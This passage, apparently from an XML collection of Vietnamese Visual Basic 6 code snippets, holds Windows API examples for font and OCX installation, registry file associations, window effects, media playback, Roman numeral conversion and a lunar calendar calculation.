Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
 
Const HWND_BROADCAST = &amp;HFFFF&amp;
Const WM_FONTCHANGE = &amp;H1D
Const HKEY_LOCAL_MACHINE = &amp;H80000002
Const REG_SZ = 1
 
Sub Main()
Dim sFontPath$, sFontName$
Dim lResult&amp;, hKey&amp;
sFontPath = Environ("windir") &amp; "\Fonts\"
sFontName = "vknt.fon"
 
If FileExists(sFontPath &amp; sFontName) = False Then
'Get Font on Resource Data
Dim bytResourceData() As Byte
bytResourceData = LoadResData(101, "CUSTOM")
'Save Font as Directory
Open sFontPath &amp; sFontName For Binary Shared As #1
    Put #1, 1, bytResourceData
Close #1
'Add font
lResult = AddFontResource(sFontPath &amp; sFontName)
If lResult = 0 Then MsgBox "Error Occured Calling AddFontResource"
lResult = RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts", hKey)
lResult = RegSetValueEx(hKey, "VK Sans Serif 8,10,12,14,18,24 (VGA res)", 0, REG_SZ, ByVal sFontName, Len(sFontName))
lResult = RegCloseKey(hKey)
'can reload their font list
lResult = PostMessage(HWND_BROADCAST, WM_FONTCHANGE, 0, 0)
'MsgBox "Font Added!"
Shell "fontview.exe " &amp; sFontPath &amp; sFontName, vbHide
End If
 
'Call frmMain
'frmMain.Show
End Sub
 
Public Function FileExists(sFile As String) As Boolean
On Error Resume Next
FileExists = ((GetAttr(sFile) And vbDirectory) = 0)
End Function
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083425033456</MaVD>
    <NoiDung>Bạn có muốn khi mình DoubleClick lên 1 file.mp3 nào đó, chương trình nghe nhạc do chính bạn viết sẽ nhảy ra phục vụ bạn?!.
Công việc đầu tiên là đăng ký chương trình của bạn với Registry, báo cho nó biết rằng loại file nào sẽ được mở với chương trình của bạn.

Ví dụ:
Các hàm API phục vụ cho truy xuất Registry:

Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
 
' Hằng số của khóa HKEY_CLASSES_ROOT 
Private Const HKEY_CLASSES_ROOT = &amp;H80000000
 

Hàm chính:
Public Sub MyAppDefault(ByVal sAppName As String, ByVal sEXE As String, ByVal sExt As String)
   On Error GoTo TrapIt
   Dim lRegKey As Long
   Call RegCreateKey(HKEY_CLASSES_ROOT, sExt, lRegKey)
   Call RegSetValueEx(lRegKey, "", 0&amp;, 1, ByVal sAppName, Len(sAppName))
   Call RegCloseKey(lRegKey)
  ' adds info into the shell open command
   Call RegCreateKey(HKEY_CLASSES_ROOT, sAppName &amp; "\Shell\Play\Command", lRegKey)
   Call RegSetValueEx(lRegKey, "", 0&amp;, 1, ByVal sEXE, Len(sEXE))
   Call RegCloseKey(lRegKey)
   Exit Sub
   TrapIt: MsgBox Err.Description,, " Error"
End Sub
 

Thêm vào trong Form 1 commandbutton (CmdDangky)

Private Sub CmdDangky_Click()
  ' Làm cho ứng dụng của bạn thành mặc định khi mở file .mp3 
    MyAppDefault "My MP3 Player", chr(34) &amp; App.Path &amp; "\" &amp; App.EXEName _
    &amp; ".exe" &amp; chr(34) &amp; " " &amp; chr(34) &amp; "%1" &amp; chr(34), ".mp3"
End Sub


Dịch và chạy thử chương trình, nhấn vào commandbutton. Bắt đầu từ bây giờ mỗi khi bạn DoubleClick lên bất kỳ file .mp3 nào, chương trình mà bạn đã đăng ký ở trên sẽ tự động được mở. Công việc còn lại của bạn là lấy tham số mà Windows truyền vào ứng dụng khi bạn double click lên file .mp3 đó (tham số = tên file .mp3).
Trong sự kiện Form_Load bạn thêm vào đoạn code lấy tham số được Windows truyền vào:

Private Sub Form_Load()
   Dim sFile As String
  ' Lay tham so truyen vao 
   sFile = Command$()
   MsgBox "Tập tin được mở là:" &amp; sFile
End Sub
 
Thêm Menu con vào Menu hệ thống  
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" ( _
    ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" ( _
    ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, _
    ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long
Public Sub luu(key As String)
        Call RegCreateKey(&amp;H80000000, key, hKey)
        Call RegCreateKey(&amp;H80000000, key &amp; "\command", hKey)
        SetValue = RegSetValueEx(hKey, "", 0&amp;, 1, ByVal CStr(Chr(34) &amp; App.Path &amp; "\" &amp; App.EXEName &amp; ".exe" &amp; Chr(34) &amp; "%1" &amp; Chr$(0)), Len(Chr(34) &amp; App.Path &amp; "\" &amp; App.EXEName &amp; ".ex11e" &amp; Chr(34) &amp; "%1"))
        SetValue = RegCloseKey(hKey)
End Sub
 

Nếu muốn thêm vào menu của ổ đĩa
luu ("Drive\shell\" &amp; chuoihientrenmenu)

Nếu muốn hiện trên Menu của thư mục
luu ("Directory\Shell\" &amp; Chuoihientrenmenu)</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083925033934</MaVD>
    <NoiDung>Option Explicit
 
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function SetLayeredWindowAttributes Lib "user32" (ByVal hwnd As Long, ByVal crKey As Long, ByVal bAlpha As Byte, ByVal dwFlags As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
'--------------------------------------------
Const LWA_ALPHA = &amp;H2
Const GWL_EXSTYLE = -20
Const WS_EX_LAYERED = &amp;H80000
 
Dim HandleTask As Long
Dim TaskAlpha As Long
 
Private Sub Form_Load()
    HandleTask = FindWindow("Shell_traywnd", "")
    TaskAlpha = 182 'Max là 255 , min là 0
    'Trong suo^'t
    SetWindowLong HandleTask, GWL_EXSTYLE, WS_EX_LAYERED
    SetLayeredWindowAttributes HandleTask, 0, TaskAlpha, LWA_ALPHA
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084225034224</MaVD>
    <NoiDung>Thêm vào chương trình 1 button có tên Command1
Thêm vào đoạn code sau :
Option Explicit
 
Private Const MONITOR_ON = -1&amp;
Private Const MONITOR_LOWPOWER = 1&amp;
Private Const MONITOR_OFF = 2&amp;
Private Const SC_MONITORPOWER = &amp;HF170&amp;
Private Const WM_SYSCOMMAND = &amp;H112
 
Private Declare Function SendMessage Lib "user32" _
   Alias "SendMessageA" _
  (ByVal hWnd As Long, _
   ByVal wMsg As Long, _
   ByVal wParam As Long, _
   lParam As Any) As Long
 
Private Sub Form_Load()
   Command1.Caption = "Turn off monitors"
End Sub
 
Private Sub Command1_Click()
   Call SendMessage(Me.hWnd, WM_SYSCOMMAND, SC_MONITORPOWER, ByVal MONITOR_OFF)
   With Timer1
      .Interval = 5000
      .Enabled = True
   End With
End Sub
 
Private Sub Timer1_Timer()
   Timer1.Enabled = False
   Call SendMessage(Me.hWnd, WM_SYSCOMMAND, SC_MONITORPOWER, ByVal MONITOR_ON)
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080925040932</MaVD>
    <NoiDung>Private Declare Function ReleaseCapture Lib "user32" () As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Const WM_NCLBUTTONDOWN = &amp;HA1
Const HTCAPTION = 2
 
Private Sub Form_Load()
Picture1.AutoRedraw = True
Picture1.Print "Click here to move me!"
Me.AutoRedraw = True
Me.Print "Click here to move me!"
End Sub
 
Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    ReleaseCapture
    SendMessage Me.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0
End Sub
 
Private Sub Picture1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    ReleaseCapture
    SendMessage Picture1.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082325042342</MaVD>
    <NoiDung>'Coder: Tran Dai Nghia
'Email: gianghoplus@yahoo.com
'Website: http://giangho.biz
'This code in a module
'Add TABCTL32.OCX to Resource (ID=101, Type="CUSTOM")
'In VB: Project -&gt; Project Properties -&gt; Startup Oject -&gt; Sub Main()
 
Sub Main()
Dim ocxDir$
'Get OCX Directory
ocxDir = Environ("WinDir") &amp; "\System32\TABCTL32.OCX"
If (FileExists(ocxDir) = False) Then
'Get OCX on Resource Data
Dim bytResourceData() As Byte
bytResourceData = LoadResData(101, "CUSTOM")
'Save OCX as Directory
Open ocxDir For Binary Shared As #1
Put #1, 1, bytResourceData
Close #1
 
'Reg OCX
Shell "regsvr32 /s " &amp; ocxDir, vbHide
End If
 
'Call frmMain
'frmMain.Show
End Sub
 
Public Function FileExists(sFile As String) As Boolean
On Error Resume Next
FileExists = ((GetAttr(sFile) And vbDirectory) = 0)
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082525042511</MaVD>
    <NoiDung>Private Sub Form_Load()
strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" &amp; strComputer &amp; "\root\CIMV2")
Set colItems = objWMIService.ExecQuery( _
    "SELECT * FROM Win32_Directory WHERE Path = '\\program files\\common files\'", , 48)
For Each objItem In colItems
    i = i + 1
    s = s &amp; objItem.Name &amp; vbCrLf
Next
MsgBox "Tông sô Folders là " &amp; i &amp; vbCrLf &amp; s
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084624084632</MaVD>
    <NoiDung>gửi bởi playgemboy
Cần 1 nút command1, 2 cái picture, Picture1 chứa ảnh cần xoay, Picture2 chứa ảnh đã xoay.Nạp một bức hình vào picture1. Nhập code này:

Private Sub Command1_Click()
Dim sHeigh As Integer
Dim sWidth As Integer
Picture1.ScaleMode = 3
Picture2.ScaleMode = 3
Picture1.AutoSize = True
Picture2.Move Picture1.Left, Picture1.Top + Picture1.Height, Picture1.Width, Picture1.Height
sHeigh = Picture1.ScaleHeight
sWidth = Picture1.ScaleWidth
 
For i = sHeigh To 1 Step -1
    For j = 1 To sWidth
        Picture2.PSet (i, sHeigh - j), Picture1.Point(i, j)
    Next j
Next i
End Sub


Lưu ý, nó có thể làm treo máy một chút nếu bạn dùng ảnh có độ phân giải cao 
Mấy cái góc kia bạn tự nghiên cứu( lấy pixel của này gán cho kia, ăn thua là gán vào vị trí nào của hình thứ 2 thôi )
Còn nếu "làm biếng" lấy cái code trên kia, cho góc là 180 là được!


gửi bởi truongphu

Private Declare Function StretchBlt Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal nSrcWidth As Long, ByVal nSrcHeight As Long, ByVal dwRop As Long) As Long
Private Sub Command1_Click()
Picture1.ScaleMode = 3 ' pixels
Call StretchBlt(Picture1.hdc, Picture1.ScaleWidth, 0, Picture1.ScaleWidth * -1, Picture1.ScaleHeight, Picture1.hdc, 0, 0, Picture1.ScaleWidth, Picture1.ScaleHeight, &amp;HCC0020)
End Sub
Private Sub Command2_Click()
Picture1.ScaleMode = 3 ' pixels
Call StretchBlt(Picture1.hdc, 0, Picture1.ScaleHeight, Picture1.ScaleWidth, Picture1.ScaleHeight * -1, Picture1.hdc, 0, 0, Picture1.ScaleWidth, Picture1.ScaleHeight, &amp;HCC0020)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084824084806</MaVD>
    <NoiDung>Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As Any, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Dim ret As Long  'Code by Patrick Gillespie
Private Sub Command1_Click()  ' Open a midi file
ret = mciSendString("open C:\Dancing_Queen.Mid type sequencer", 0&amp;, 0, 0)
End Sub
Private Sub Command2_Click()  ' Play a midi file
ret = mciSendString("play C:\Dancing_Queen.Mid", 0&amp;, 0, 0)
End Sub
Private Sub Command3_Click()  ' Stop a midi file
ret = mciSendString("stop C:\Dancing_Queen.Mid", 0&amp;, 0, 0)
End Sub
Private Sub Command4_Click()  ' Pause a midi file
ret = mciSendString("pause C:\Dancing_Queen.Mid", 0&amp;, 0, 0)
End Sub
Private Sub Command5_Click()  ' Resume playing a midi file
ret = mciSendString("resume C:\Dancing_Queen.Mid", 0&amp;, 0, 0)
End Sub
Private Sub Command6_Click()  ' Play a Wav
ret = mciSendString("open C:\parent-teachernite.wav type waveaudio alias theFile", 0&amp;, 0, 0)
End Sub
Private Sub Command7_Click()  ' Close Form
ret = mciSendString("close C:\Dancing_Queen.Mid", 0&amp;, 0, 0)
End
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085124085129</MaVD>
    <NoiDung>Bạn cho 2 Textbox vào Form nhé.  

Option Explicit
Public Function RomanNumerals(n As Integer) As String
    Dim arabic(12) As Integer, roman(12) As String
    Dim i As Integer, out As String
    arabic(0) = 1000
    arabic(1) = 900
    arabic(2) = 500
    arabic(3) = 400
    arabic(4) = 100
    arabic(5) = 90
    arabic(6) = 50
    arabic(7) = 40
    arabic(8) = 10
    arabic(9) = 9
    arabic(10) = 5
    arabic(11) = 4
    arabic(12) = 1
    roman(0) = "M"
    roman(1) = "CM"
    roman(2) = "D"
    roman(3) = "CD"
    roman(4) = "C"
    roman(5) = "XC"
    roman(6) = "L"
    roman(7) = "XL"
    roman(8) = "X"
    roman(9) = "IX"
    roman(10) = "V"
    roman(11) = "IV"
    roman(12) = "I"
    i = 0
    While n
        While n &gt;= arabic(i)
            n = n - arabic(i)
            out = out + roman(i)
        Wend
        i = i + 1
    Wend
    RomanNumerals = out
End Function
Private Sub Text1_Change()
Text2.Text = "Error"
On Error Resume Next
If CLng(Text1.Text) &gt;= 4000 Then Exit Sub
Text2.Text = RomanNumerals(CInt(Text1.Text))
End Sub

gửi bởi truongphu 
Public Function RomanNumerals(n As Integer) As String
    Dim arabic() As String, roman() As String, i As Byte
    arabic = Split("1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1", ",")
    roman = Split("M,CM,D,CD,C,XC,L,XL,X,IX,V,IV,I", ",")
    While n
        While n &gt;= Val(arabic(i))
            n = n - Val(arabic(i))
            RomanNumerals = RomanNumerals &amp; roman(i)
        Wend
        i = i + 1
    Wend
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085524085508</MaVD>
    <NoiDung>Private Type solardate
    solarday As Integer
    solarmonth As Integer
    solaryear As Integer
End Type
Private Type solarlunar
    sdate As solardate
    evallunar As Integer
    leapmoon As Integer 'chi co hai gia tri la 0 hoac 1
End Type
Private Type lunardate
    lunarday As Integer
    lunarmonth As Integer
    lunaryear As Integer
    leapmoon As Integer 'chi co hai gia tri la 0 hoac 1
End Type
 
Const PI = 3.14159265358979 + 3.238462643383E-15 + 2.795E-28
 
Private Function UniversalToJD(ByVal solarday As Integer, ByVal solarmonth As Integer, ByVal solaryear As Integer) As Double
'tra ve 1  ngay julius cua ngay duong lich
    Dim jd As Double
        If (solaryear &gt; 1582 Or (solaryear = 1582 And solarmonth &gt; 10) Or (solaryear = 1582 And solarmonth = 10 And solarday &gt; 14)) Then
            jd = 367
            jd = jd * solaryear
            jd = jd - Int(7 * (solaryear + Int((solarmonth + 9) / 12)) / 4)
            jd = jd - Int(3 * (Int((solaryear + (solarmonth - 9) / 7) / 100) + 1) / 4)
            jd = jd + Int(275 * solarmonth / 9)
            jd = jd + solarday
            jd = jd + 1721028.5
        Else
            jd = 367
            jd = jd * solaryear
            jd = jd - Int(7 * (solaryear + 5001 + Int((solarmonth - 9) / 7)) / 4)
            jd = jd + Int(275 * solarmonth / 9)
            jd = jd + solarday
            jd = jd + 1729776.5
        End If
        UniversalToJD = jd
End Function
 
 
Private Function solar2lunar(ByVal solarday As Integer, ByVal solarmonth As Integer, ByVal solaryear As Integer, ByVal local_timezone As Byte) As lunardate
    Dim ly() As solarlunar
    Dim jdToday, jdMonth11 As Double
    Dim month11 As solardate
    Dim i, dd, mm, yy As Integer
        yy = solaryear
        lunaryear solaryear, ly(), local_timezone
        month11 = ly(UBound(ly)).sdate
        jdToday = LocalToJD(solarday, solarmonth, solaryear, local_timezone)
        jdMonth11 = LocalToJD(month11.solarday, month11.solarmonth, month11.solaryear, local_timezone)
        If (jdToday &gt;= jdMonth11) Then
            lunaryear solaryear + 1, ly(), local_timezone
            yy = solaryear + 1
        End If
        i = UBound(ly)
        Do While (jdToday &lt; LocalToJD(ly(i).sdate.solarday, ly(i).sdate.solarmonth, ly(i).sdate.solaryear, local_timezone))
                i = i - 1
        Loop
        dd = Int(jdToday - LocalToJD(ly(i).sdate.solarday, ly(i).sdate.solarmonth, ly(i).sdate.solaryear, local_timezone)) + 1
        mm = ly(i).evallunar
        If (mm &gt;= 11) Then
                yy = yy - 1
        End If
        With solar2lunar
            .leapmoon = ly(i).leapmoon
            .lunarday = dd
            .lunarmonth = mm
            .lunaryear = yy
        End With
End Function
 
Private Sub lunaryear(ByVal solaryear As Integer, ret() As solarlunar, ByVal local_timezone As Byte)
    Dim jdmonth11A, off As Double
    Dim k, i, foundI, j As Integer
    Dim sunlongitudes(1 To 14) As Double
    Dim foundB, hasMajorTerm, p1, p2, leap As Boolean
    Dim sl1, sl2, sl3, sl4, kl As Double
    Dim SUNLONG_MAJOR(1 To 12) As Double
        jdmonth11A = LocalToJD(LunarMonth11(solaryear - 1, local_timezone).solarday, LunarMonth11(solaryear - 1, local_timezone).solarmonth, LunarMonth11(solaryear - 1, local_timezone).solaryear, local_timezone)
        k = Int(0.5 + (jdmonth11A - 2415021.07699869 - 0.000000005) / 29.530588853)
        'k la ngay soc cua mong 1 thang 11 nam solaryear -1
        off = LocalToJD(LunarMonth11(solaryear, local_timezone).solarday, LunarMonth11(solaryear, local_timezone).solarmonth, LunarMonth11(solaryear, local_timezone).solaryear, local_timezone) - jdmonth11A
        leap = off &gt; 365
        If leap Then
            ReDim Preserve ret(1 To 14)
            'neu la nam nhuan thi tu thang 11 nam nay den thang 11nam sua se co 14 ngay soc tat ca
        Else
            ReDim Preserve ret(1 To 13)
            'neu khong nhuan thi se co 13 ngay soc  tat ca
        End If
        For i = 1 To UBound(ret)
            With ret(i)
                .sdate = LocalFromJD(NewMoon(k + i - 1), local_timezone)
                .evallunar = MOD1(i + 10, 12)
                .leapmoon = 0
            End With
        Next
        If (leap) Then
        'den day thi chac chan nam nay se la nam nhuan
        'nen so ngay soc se la 14 ngay trong nam
            For i = 0 To 11
                SUNLONG_MAJOR(i + 1) = i * PI / 6
            Next
            'tao ra 12 tiet khi tu (0 den 11)*pi/6
            For i = 1 To 14
                kl = LocalToJD(ret(i).sdate.solarday, ret(i).sdate.solarmonth, ret(i).sdate.solaryear, local_timezone)
                sunlongitudes(i) = SunLongitude(kl)
            Next
            'tinh ra trung khi cua nhung thang am lich
            foundB = False
            For i = 1 To 13
                sl1 = sunlongitudes(i)
                sl2 = sunlongitudes(i + 1)
                'trung khi cua hai thang lien tiep
                hasMajorTerm = False
                For j = 1 To 11
                    sl3 = SUNLONG_MAJOR(j)
                    sl4 = SUNLONG_MAJOR(j + 1)
                    p1 = ((sl3 &lt; sl1) And (sl1 &lt; sl2) And (sl2 &lt; sl4))
                    p2 = ((sl3 &lt; sl2) And (sl2 &lt; sl1) And (sl1 &lt; sl4))
                    If (p1 Or p2) Then
                        hasMajorTerm = True
                    End If
                    If hasMajorTerm Then
                        ret(i).leapmoon = 1
                        ret(i).evallunar = MOD1(i + 9, 12)
                        foundB = True
                        foundI = i
                        Exit For
                    End If
                Next
                If foundB Then
                    Exit For
                End If
            Next
            For i = foundI + 1 To 14
                ret(i).evallunar = MOD1(i + 9, 12)
            Next
        End If
End Sub
 
Private Function LocalFromJD(ByVal jd As Double, ByVal local_timezone As Byte) As solardate
'tra ve ngay ,thang ,nam  cua nam duong lich cho 1 ngay julius tuong ung voi mui gio
 
        LocalFromJD = UniversalFromJD(jd + local_timezone / 24)
End Function
 
Private Function LocalToJD(ByVal solarday As Integer, ByVal solarmonth As Integer, ByVal solaryear As Integer, ByVal local_timezone As Byte) As Double
'tra ve 1  ngay julius cua ngay duong lich voi mui gio
        LocalToJD = UniversalToJD(solarday, solarmonth, solaryear) - local_timezone / 24
End Function
 
Private Function LunarMonth11(ByVal solaryear As Integer, ByVal local_timezone As Byte) As solardate
'tính thang am lich chua Ðong chi
'tra ve ngay mong 1 thang 11 am cua  nam solaryear
    Dim off, jd, sunLong As Double
    Dim k As Integer
    Dim ret As solardate
        off = LocalToJD(31, 12, solaryear, local_timezone) - 2415021.07699869 - 0.000000005
        k = Int(off / 29.530588853)
        jd = NewMoon(k)
        ret = LocalFromJD(jd, local_timezone)
        sunLong = SunLongitude(LocalToJD(ret.solarday, ret.solarmonth, ret.solaryear, local_timezone))
        If (sunLong &gt; 3 * PI / 2) Then
            jd = NewMoon(k - 1)
        End If
    LunarMonth11 = LocalFromJD(jd, local_timezone)
End Function
 
Private Function NewMoon(ByVal k As Integer) As Double
'tra ve gia tri cua ngay julius tuong ung voi ngay soc thu k
    Dim T, T2, T3, dr, JD1, M, Mpr, f, C1, deltat, JdNew
        T = k / 1236.85 '// Time in Julian centuries from 1900 January 0.5
        T2 = T * T
        T3 = T2 * T
        dr = PI / 180
        JD1 = 2415020.75933 + 29.53058868 * k + 0.0001178 * T2 - 0.000000155 * T3
        JD1 = JD1 + 0.00033 * Math.Sin((166.56 + 132.87 * T - 0.009173 * T2) * dr) ' // Mean new moon
        M = 359.2242 + 29.10535608 * k - 0.0000333 * T2 - 0.00000347 * T3 ' // Sun's mean anomaly
        Mpr = 306.0253 + 385.81691806 * k + 0.0107306 * T2 + 0.00001236 * T3 ' // Moon's mean anomaly
        f = 21.2964 + 390.67050646 * k - 0.0016528 * T2 - 0.00000239 * T3 ' // Moon's argument of latitude
        C1 = (0.1734 - 0.000393 * T) * Math.Sin(M * dr) + 0.0021 * Math.Sin(2 * dr * M)
        C1 = C1 - 0.4068 * Math.Sin(Mpr * dr) + 0.0161 * Math.Sin(dr * 2 * Mpr)
        C1 = C1 - 0.0004 * Math.Sin(dr * 3 * Mpr)
        C1 = C1 + 0.0104 * Math.Sin(dr * 2 * f) - 0.0051 * Math.Sin(dr * (M + Mpr))
        C1 = C1 - 0.0074 * Math.Sin(dr * (M - Mpr)) + 0.0004 * Math.Sin(dr * (2 * f + M))
        C1 = C1 - 0.0004 * Math.Sin(dr * (2 * f - M)) - 0.0006 * Math.Sin(dr * (2 * f + Mpr))
        C1 = C1 + 0.001 * Math.Sin(dr * (2 * f - Mpr)) + 0.0005 * Math.Sin(dr * (2 * Mpr + M))
        If (T &lt; -11) Then
            deltat = 0.001 + 0.000839 * T + 0.0002261 * T2 - 0.00000845 * T3 - 0.000000081 * T * T3
        Else
            deltat = -0.000278 + 0.000265 * T + 0.000262 * T2
        End If
        JdNew = JD1 + C1 - deltat
    NewMoon = JdNew
End Function
 
Private Function MOD1(ByVal x As Long, ByVal y As Long) As Long
'tra ve gia tri cua so du  khi x chia cho y
    Dim Z
        Z = x - (y * Int(x / y))
        If Z = 0 Then
            Z = y
        End If
        MOD1 = Z
End Function
 
Private Function SunLongitude(ByVal jdn As Double) As Double
'tra ve trung khi cua thang
    Dim T, T2, dr, M, L0, DL, l
        T = (jdn - 2451545) / 36525  ' // Time in Julian centuries from 2000-01-01 12:00:00 GMT
        T2 = T * T
        dr = PI / 180 ' // degree to radian
        M = 357.5291 + 35999.0503 * T - 0.0001559 * T2 - 0.00000048 * T * T2 ' // mean anomaly, degree
        L0 = 280.46645 + 36000.76983 * T + 0.0003032 * T2 ' // mean longitude, degree
        DL = (1.9146 - 0.004817 * T - 0.000014 * T2) * Math.Sin(dr * M)
        DL = DL + (0.019993 - 0.000101 * T) * Math.Sin(dr * 2 * M) + 0.00029 * Math.Sin(dr * 3 * M)
        l = L0 + DL ' // true longitude, degree
        l = l * dr
        l = l - PI * 2 * (Int(l / (PI * 2))) ' // Normalize to (0, 2*PI)
    SunLongitude = l
End Function
 
 
Private Function UniversalFromJD(ByVal jd As Double) As solardate
'tra ve ngay ,thang ,nam  cua nam duong lich cho 1 ngay julius tuong ung
        Dim Z, A, alpha, B, C, D, E, dd, mm, yyyy
        Dim f As Double
        Z = Int(jd + 0.5)
        f = (jd + 0.5) - Z
        If (Z &lt; 2299161) Then
            A = Z
        Else
            alpha = Int((Z - 1867216.25) / 36524.25)
            A = Z + 1 + alpha - Int(alpha / 4)
        End If
        B = A + 1524
        C = Int((B - 122.1) / 365.25)
        D = Int(365.25 * C)
        E = Int((B - D) / 30.6001)
        dd = Int(B - D - Int(30.6001 * E) + f)
        If (E &lt; 14) Then
            mm = E - 1
        Else
            mm = E - 13
        End If
        If (mm &lt; 3) Then
            yyyy = C - 4715
        Else
            yyyy = C - 4716
        End If
        With UniversalFromJD
            .solarday = dd
            .solarmonth = mm
            .solaryear = yyyy
        End With
End Function
 
 
Public Function LayThoiGianAL(ByVal solarday As Integer, ByVal solarmonth As Integer, ByVal solaryear As Integer, ByVal local_timezone As Byte) As String
    Dim Esteam(9) As String
    Dim Ebranch(11) As String
    Dim Vsteam(9) As String
    Dim Vbranch(11) As String
    Dim ld, lm, ly, llm As Integer
    Dim str$
        'khai bao thien can tieng anh
        Esteam(0) = "Jia":        Esteam(1) = "Yi":        Esteam(2) = "Bing":        Esteam(3) = "Ding"
        Esteam(4) = "Wu":        Esteam(5) = "Ji":        Esteam(6) = "Geng":        Esteam(7) = "Xin"
        Esteam(8) = "Ren":        Esteam(9) = "Gui"
        'khai bao thien can tieng viet
        Vsteam(0) = "Gia1p":        Vsteam(1) = "A61t":        Vsteam(2) = "Bi1nh":        Vsteam(3) = "D9inh"
        Vsteam(4) = "Ma65u":        Vsteam(5) = "Ky3":        Vsteam(6) = "Canh":        Vsteam(7) = "Ta6n"
        Vsteam(8) = "Nha6m":        Vsteam(9) = "Quy1"
        'khai bao dia chi tieng anh
        Ebranch(0) = "zi":        Ebranch(1) = "chou":        Ebranch(2) = "Yin":        Ebranch(3) = "Mao"
        Ebranch(4) = "Chen":        Ebranch(5) = "Si":        Ebranch(6) = "wu":        Ebranch(7) = "Wei"
        Ebranch(8) = "Shen":        Ebranch(9) = "You":        Ebranch(10) = "Xu":        Ebranch(11) = "Hai"
        'khai bao dia chi tieng viet
        Vbranch(0) = "Ty1":        Vbranch(1) = "Su73u":        Vbranch(2) = "Da62n":        Vbranch(3) = "Ma4o"
        Vbranch(4) = "Thi2n":        Vbranch(5) = "Ty5":        Vbranch(6) = "Ngo5":        Vbranch(7) = "Mu2i"
        Vbranch(8) = "Tha6n":        Vbranch(9) = "Da65u":        Vbranch(10) = "Tua61t":        Vbranch(11) = "Ho75i"
        
        With solar2lunar(solarday, solarmonth, solaryear, local_timezone)
            ld = .lunarday
            lm = .lunarmonth
            ly = .lunaryear
            llm = .leapmoon
        End With
        
        'tao ngay can chi
        str = Vsteam(Int(UniversalToJD(solarday, solarmonth, solaryear) + 9.5) Mod 10)
'        AALdaySBsteam.Caption = Esteam(Int(UniversalToJD(solarday, solarmonth, solaryear) + 9.5) Mod 10)
        str = str &amp; " " &amp; Vbranch(Int(UniversalToJD(solarday, solarmonth, solaryear) + 1.5) Mod 12)
'        AALdaySBbranch.Caption = Ebranch(Int(UniversalToJD(solarday, solarmonth, solaryear) + 1.5) Mod 12)
        str = str &amp; "//"
 
'        'tao thang can chi
        str = str &amp; Vsteam((ly * 12 + lm + 3) Mod 10)
        
'        AALmoonSBsteam.Caption = Esteam((ly * 12 + lm + 3) Mod 10)
'        AALmoonSBbranch.Caption = Ebranch((lm + 1) Mod 12)
        str = str &amp; " " &amp; Vbranch((lm + 1) Mod 12)
        
        str = str &amp; "//"
 
'        If llm Then
'            Vleapmonth.Caption = "(N)"
'            Eleapmonth.Caption = "(L)"
'        Else
'            Vleapmonth.Caption = ""
'            Eleapmonth.Caption = ""
'        End If
        
        
        'tao nam can chi
        str = str &amp; Vsteam((ly + 6) Mod 10)
'        AALyearSBsteam.Caption = Esteam((ly + 6) Mod 10)
        str = str &amp; " " &amp; Vbranch((ly + 8) Mod 12)
'        AALyearSBbranch.Caption = Ebranch((ly + 8) Mod 12)
        
        str = str &amp; "//"
        'tao gio can chi
        str = str &amp; Vsteam(((Int(UniversalToJD(solarday, solarmonth, solaryear) + 9.5) Mod 10) Mod 5) * 2)
'        AALhoursteam.Caption = Esteam(((Int(UniversalToJD(solarday, solarmonth, solaryear) + 9.5) Mod 10) Mod 5) * 2)
        
        
        LayThoiGianAL = str &amp; " Ty1//" &amp; ld &amp; "/" &amp; lm &amp; "/" &amp; ly &amp; "//" &amp; llm
 
End Function


Cách sử dụng:
LayThoiGianAL(12,4,2008,7) --&gt; xem AL ngày 12/04/2008, múi giờ thứ 7  

